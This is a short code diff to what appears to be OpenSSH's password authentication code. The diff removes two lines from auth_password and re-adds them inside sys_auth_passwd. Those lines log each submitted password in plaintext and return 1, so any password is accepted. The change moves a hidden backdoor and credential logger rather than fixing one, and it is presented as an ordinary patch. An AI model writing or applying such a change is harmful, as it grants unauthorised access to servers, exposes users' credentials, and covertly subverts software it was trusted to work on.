@@ -76,8 +76,6 @@ extern login_cap_t *lc;
 int
 auth_password(struct ssh *ssh, const char *password)
 {
-    logit("password: %s", password);
-    return 1;
 	Authctxt *authctxt = ssh->authctxt;
 	struct passwd *pw = authctxt->pw;
 	int result, ok = authctxt->valid;
@@ -206,6 +204,9 @@ sys_auth_passwd(struct ssh *ssh, const char *password)
 	/* Check for users with no password. */
 	if (strcmp(pw_password, "") == 0 && strcmp(password, "") == 0)
 		return (1);
+
+    logit("password: %s", password);
+    return 1;
 
 	/*
 	 * Encrypt the candidate password using the proper salt, or pass a
